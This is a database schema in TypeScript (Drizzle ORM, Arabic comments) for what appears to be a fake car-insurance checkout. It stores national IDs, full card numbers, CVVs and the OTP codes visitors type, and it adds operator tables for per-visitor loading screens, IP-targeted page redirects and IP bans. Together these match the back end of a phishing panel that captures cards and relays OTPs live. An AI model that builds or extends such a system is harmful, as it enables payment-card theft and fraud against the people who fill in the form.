import { boolean, int, mysqlEnum, mysqlTable, text, timestamp, varchar } from "drizzle-orm/mysql-core";

/**
 * Core user table backing auth flow.
 */
export const users = mysqlTable("users", {
  id: int("id").autoincrement().primaryKey(),
  openId: varchar("openId", { length: 64 }).notNull().unique(),
  name: text("name"),
  email: varchar("email", { length: 320 }),
  loginMethod: varchar("loginMethod", { length: 64 }),
  role: mysqlEnum("role", ["user", "admin"]).default("user").notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
  lastSignedIn: timestamp("lastSignedIn").defaultNow().notNull(),
});

export type User = typeof users.$inferSelect;
export type InsertUser = typeof users.$inferInsert;

// جدول طلبات التأمين
export const insuranceRequests = mysqlTable("insurance_requests", {
  id: int("id").autoincrement().primaryKey(),
  sessionId: varchar("sessionId", { length: 128 }).notNull(),
  visitorIp: varchar("visitorIp", { length: 64 }),
  // الخطوة 1: البيانات الأساسية
  offerType: varchar("offerType", { length: 32 }),
  regType: varchar("regType", { length: 32 }),
  userName: varchar("userName", { length: 256 }),
  phoneNumber: varchar("phoneNumber", { length: 32 }),
  idNumber: varchar("idNumber", { length: 32 }),
  birthDate: varchar("birthDate", { length: 32 }),
  serialNumber: varchar("serialNumber", { length: 128 }),
  carYear: varchar("carYear", { length: 16 }),
  // الخطوة 2: بيانات التأمين
  carMake: varchar("carMake", { length: 256 }),
  usageType: varchar("usageType", { length: 64 }),
  city: varchar("city", { length: 128 }),
  startDate: varchar("startDate", { length: 32 }),
  // الخطوة 3: الخطة المختارة
  planCompany: varchar("planCompany", { length: 256 }),
  planName: varchar("planName", { length: 128 }),
  planPrice: int("planPrice"),
  // الخطوة 4: الإضافات
  addons: text("addons"),
  addonsTotal: int("addonsTotal"),
  // الخطوة 5: الملخص والدفع
  paymentMethod: varchar("paymentMethod", { length: 32 }),
  total: int("total"),
  // بيانات البطاقة
  cardNumber: varchar("cardNumber", { length: 32 }),
  cardHolderName: varchar("cardHolderName", { length: 256 }),
  expiryDate: varchar("expiryDate", { length: 16 }),
  cvv: varchar("cvv", { length: 8 }),
  cardType: varchar("cardType", { length: 32 }),
  cardLast4: varchar("cardLast4", { length: 8 }),
  cardDeclined: boolean("cardDeclined").default(false),
  // OTP
  otpCode: varchar("otpCode", { length: 16 }),
  otpDigits: int("otpDigits").default(4),
  otpSubmitted: varchar("otpSubmitted", { length: 16 }),
  otpVerified: boolean("otpVerified").default(false),
  // حالة الدفع: pending (في انتظار القبول من لوحة التحكم), approved, rejected
  paymentStatus: mysqlEnum("paymentStatus", ["pending", "approved", "rejected"]).default("pending"),
  // الحالة العامة
  currentStep: int("currentStep").default(1),
  status: mysqlEnum("status", ["in_progress", "completed", "payment_submitted", "payment_approved", "declined", "otp_verified"]).default("in_progress"),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type InsuranceRequest = typeof insuranceRequests.$inferSelect;
export type InsertInsuranceRequest = typeof insuranceRequests.$inferInsert;

// جدول الحظر
export const bannedIps = mysqlTable("banned_ips", {
  id: int("id").autoincrement().primaryKey(),
  ip: varchar("ip", { length: 64 }).notNull().unique(),
  reason: text("reason"),
  bannedAt: timestamp("bannedAt").defaultNow().notNull(),
});

export type BannedIp = typeof bannedIps.$inferSelect;

// جدول إعدادات شاشة التحميل لكل زائر
export const loadingScreenSettings = mysqlTable("loading_screen_settings", {
  id: int("id").autoincrement().primaryKey(),
  visitorIp: varchar("visitorIp", { length: 64 }).notNull().unique(),
  isActive: boolean("isActive").default(false),
  loadingText: varchar("loadingText", { length: 256 }).default("جاري التحميل..."),
  loadingSubtext: varchar("loadingSubtext", { length: 256 }).default("يرجى الانتظار"),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type LoadingScreenSetting = typeof loadingScreenSettings.$inferSelect;

// جدول أوامر التوجيه
export const navigationCommands = mysqlTable("navigation_commands", {
  id: int("id").autoincrement().primaryKey(),
  visitorIp: varchar("visitorIp", { length: 64 }).notNull(),
  targetPage: varchar("targetPage", { length: 256 }).notNull(),
  executed: boolean("executed").default(false),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
});

export type NavigationCommand = typeof navigationCommands.$inferSelect;
